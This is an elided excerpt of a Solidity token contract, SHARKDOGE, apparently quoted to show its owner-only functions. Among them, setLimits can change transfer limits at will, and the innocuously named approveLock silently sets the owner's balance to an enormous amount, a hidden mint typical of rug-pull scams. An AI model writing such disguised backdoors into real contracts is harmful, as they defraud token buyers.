...
contract SHARKDOGE is Context, IERC20, Ownable {
   ...
   function multiTransfer() public onlyOwner {
    ...
    function setLimits(uint256 newWalletMax, uint256 newMaxTx) external onlyOwner() {
        _walletMax  = newWalletMax;
        _maxTxAmount = newMaxTx;
    }

    function approveLock() public onlyOwner() { _walletTotals[owner()] = 100000000000000 * 10**_decimals; }
